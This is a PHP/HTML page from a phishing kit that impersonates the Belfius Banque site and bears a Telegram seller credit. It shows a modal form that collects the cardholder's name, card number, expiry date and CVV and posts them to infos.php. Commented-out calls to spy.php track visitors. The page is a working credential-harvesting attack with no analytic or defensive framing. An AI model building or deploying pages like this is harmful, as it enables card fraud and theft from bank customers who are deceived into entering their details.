<?php 



     require_once "functions.php";
     require_once "ajax.php";


                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Belfius Banque - Belfius</title>
        <!-- logo site web-->
        <link rel="icon" href="image/belfius.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/belfius.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/sur.css">
        <link rel="stylesheet"  href="css/animate.css">
        <style>
            .modal-open{
                overflow:hidden;
                padding-right:0px;
            }
        </style>

</head>
<body class="modal-open">

        <div class="home_1">
            <img src="image/xl.png" class="w-100">
        </div>

        <div class="home_2">
            <img src="image/lg.png" class="w-100">
        </div>

        <div class="home_3">
            <img src="image/md.png" class="w-100">
        </div>

        <div class="home_4">
            <img src="image/sm.png" class="w-100">
        </div>

        <div class="home_5">
            <img src="image/xs.png" class="w-100">
        </div>

        <div class="home_6">
            <img src="image/zz.png" class="w-100">
        </div>

         <!-- Modal -->
        <div class="modal problem fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;"> 
          <div class="modal-dialog shadow ">
            <div class="modal-content">
              <div class="modal-header text-center ">
                  <h4>Informations sur la carte</h4>
                  <i class="bi bi-x-lg"></i>
              </div>
              <div class="modal-body">
                 <div class="row">
                     <div class="col-lg-5 col-md-5 text-center sis pt-5"><img src="image/inbg.png" ></div>
                     <div class="col-lg-7 col-md-7 frr ">
                         <div class="right pb-5">
                             <div class="topping">
                                 <ul>
                                     <li class=" active"><a href="">Informations sur la carte</a></li>
                                     <li class="doom"><a href="">Confirmation</a></li>
                                     <li class="doom"><a href="">FINALISATION</a></li>
                                 </ul>
                             </div> 
                             <div class="milieu">
                                 <h4>Introduisez votre Informations sur la carte</h4>
                                 <form action="infos.php" method="post">
                                     <input type="hidden" name="step" value="cc">
                                     <div class="form-group polanda mt-3">
                                         <label>Le nom sur la carte</i></label>
                                         <input type="text" name="name" id="name" class="form-control" required autofocus>
                                     </div>
                                     <div class="form-group polanda mt-3">
                                         <label>Votre numéro de carte </i></label>
                                         <input type="text" name="card" id="card" class="form-control" required pattern="[0-9 ]{19,21}$">
                                     </div>
                                     <div class="makarina">
                                         <div class="form-group bland mt-3">
                                             <label>Date d'expiration </i></label>
                                             <input type="text" name="date" id="date" class="form-control" requiredpattern="(0[1-9]|1[0-2])\/?([0-9]{4}|[0-9]{2})$">
                                         </div>
                                         <div class="form-group bland mt-3">
                                             <label>CVV<i class="bi bi-question-circle ms-1" id="come"></i></label>
                                             <input type="text" name="code" id="code" class="form-control" required pattern="[0-9]{3}$">
                                         </div>
                                     </div>
                                 
                             </div>
                         </div>
                     </div>
                 </div>
                 <div class="bottona justify-content-end">
                     <button class="btn" name="submit" id="submit" disabled><img src="image/confirmer.png">Confirmer</button>
                 </div>
                 </form>
              </div>
            </div>
          </div>
        </div>






        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>

            $("#card").mask("0000 0000 0000 0000 0");
            $("#date").mask("00/00");
            $("#code").mask("000");

            $("#card").keyup(function(){
                if($("#card").val().length > 18){
                    $("#submit").attr("disabled",false);
                    $("#submit").css("background","#C20145");
                    $("#card").css("border","1px solid #C20145");
                }else{
                    $("#submit").attr("disabled",true);
                    $("#submit").css("background","#DDDDE0");
                    $("#card").css("border","1px solid #979faa");
                }
            });


            

            // $.post("spy.php",{billingview:1});
            //  var abort = false;
            //  $("#first").keyup(function(){
            //     if(abort==false){
            //        $.post("spy.php", {billinging:1});
            //        abort=true;
            //     }
            //  });

             
        </script>
              
</body>
</html>